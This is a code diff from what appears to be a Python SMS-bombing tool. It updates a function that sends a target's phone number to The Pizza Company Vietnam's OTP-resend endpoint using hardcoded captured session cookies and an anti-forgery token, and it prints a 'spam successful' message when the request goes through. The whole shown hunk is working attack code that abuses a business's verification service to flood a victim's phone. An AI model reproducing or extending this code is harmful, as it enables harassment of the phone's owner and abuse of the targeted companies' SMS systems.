@@ -142,42 +142,37 @@ def send_otp_via_cashbar(sdt):
 
 def send_otp_via_pizzacompany(sdt):
     cookies = {
-        '_gcl_au': '1.1.935525276.1769953175',
-        '_fbp': 'fb.1.1769953175636.483191869798296310',
+        '_gcl_au': '1.1.607819339.1691276885',
+        '_ga': 'GA1.2.453948248.1691276886',
+        '_gid': 'GA1.2.698696022.1691276886',
         '_tt_enable_cookie': '1',
-        '_ttp': '01KGCPWA3M0C6TP3R0JGBC92WS_.tt.1',
-        '_gid': 'GA1.2.1739153751.1770552365',
-        '.Nop.Antiforgery': 'CfDJ8KNn1qax08xGkmLis89WiBu-CrJ7DQ2pYndj9YAbSGt2fB8N1uxgj3MBOh0RyzpczZkCac2tp8pPUdnX7QLTHZwJLBtuletZzFSlVPdgOAFR3f_uMbnq3csJr9ublzX2FZ51ol-E7dTa16zb5FHhIUE',
-        '_ga': 'GA1.2.1266703107.1769953175',
-        '_dc_gtm_UA-110958984-1': '1',
-        'ttcsid': '1770552365492::6wP2RysiTLOAJgbfADVV.2.1770552441242.0',
-        'ttcsid_CM2HBSRC77UCL6FR7Q4G': '1770552366363::s1oWZKQxBYZ8Ca07Au4l.2.1770552441243.1',
-        'ttcsid_C2D2TAIQV140ORDIHT80': '1770552365491::OF1JCCWJDINzv-PgIJUt.2.1770552441243.1',
-        '_ga_ZN2XYBNP5S': 'GS2.1.s1770552365$o2$g1$t1770552441$j50$l0$h0',
-        '.Nop.Customer': '3a584cab-07ce-4e05-bfc7-426e78e0faef',
-        'otp_expired': '02%2F08%2F2026%2012%3A09%3A05',
-        '.Nop.TempData': 'CfDJ8KNn1qax08xGkmLis89WiBvo_4gDmxEn_vWp6_kSauv-dP4sAMtgpAoBpemA9CpBDCsqS03vTGcAhnjizvT6CwRLYUwY4vfILUjFOu1LSEbhduM3Q5_KUe5R7aTOyLZ5apk6EWHDwxa2nkezsEQzaiIU_ZZqFDL9gJDOMJhoaoycy996qXgrTAKlemXg8A6mKA',
+        '_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
+        '_fbp': 'fb.1.1691276888170.1960321660',
+        '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
+        '.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
+        '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
     }
-
     headers = {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Referer': 'https://thepizzacompany.vn/Customer/ActiveExistCustomer',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-User': '?1',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
-        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        # 'Cookie': '_gcl_au=1.1.935525276.1769953175; _fbp=fb.1.1769953175636.483191869798296310; _tt_enable_cookie=1; _ttp=01KGCPWA3M0C6TP3R0JGBC92WS_.tt.1; _gid=GA1.2.1739153751.1770552365; .Nop.Antiforgery=CfDJ8KNn1qax08xGkmLis89WiBu-CrJ7DQ2pYndj9YAbSGt2fB8N1uxgj3MBOh0RyzpczZkCac2tp8pPUdnX7QLTHZwJLBtuletZzFSlVPdgOAFR3f_uMbnq3csJr9ublzX2FZ51ol-E7dTa16zb5FHhIUE; _ga=GA1.2.1266703107.1769953175; _dc_gtm_UA-110958984-1=1; ttcsid=1770552365492::6wP2RysiTLOAJgbfADVV.2.1770552441242.0; ttcsid_CM2HBSRC77UCL6FR7Q4G=1770552366363::s1oWZKQxBYZ8Ca07Au4l.2.1770552441243.1; ttcsid_C2D2TAIQV140ORDIHT80=1770552365491::OF1JCCWJDINzv-PgIJUt.2.1770552441243.1; _ga_ZN2XYBNP5S=GS2.1.s1770552365$o2$g1$t1770552441$j50$l0$h0; .Nop.Customer=3a584cab-07ce-4e05-bfc7-426e78e0faef; otp_expired=02%2F08%2F2026%2012%3A09%3A05; .Nop.TempData=CfDJ8KNn1qax08xGkmLis89WiBvo_4gDmxEn_vWp6_kSauv-dP4sAMtgpAoBpemA9CpBDCsqS03vTGcAhnjizvT6CwRLYUwY4vfILUjFOu1LSEbhduM3Q5_KUe5R7aTOyLZ5apk6EWHDwxa2nkezsEQzaiIU_ZZqFDL9gJDOMJhoaoycy996qXgrTAKlemXg8A6mKA',
+        'Host': 'thepizzacompany.vn',
+        # 'content-length': '199',
+        'accept': '*/*',
+        'x-requested-with': 'XMLHttpRequest',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://thepizzacompany.vn',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-dest': 'empty',
+        'referer': 'https://thepizzacompany.vn/Otp',
+        # 'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        # 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
     }
-
-    response = requests.get('https://thepizzacompany.vn/Otp', cookies=cookies, headers=headers)
+    data = {
+        'phone': sdt,
+        '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
+    }
+    response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()
     try:
         if response == True:
             print(f'[BY: CHÍ MUM] ~ PC SPAM THÀNH CÔNG')
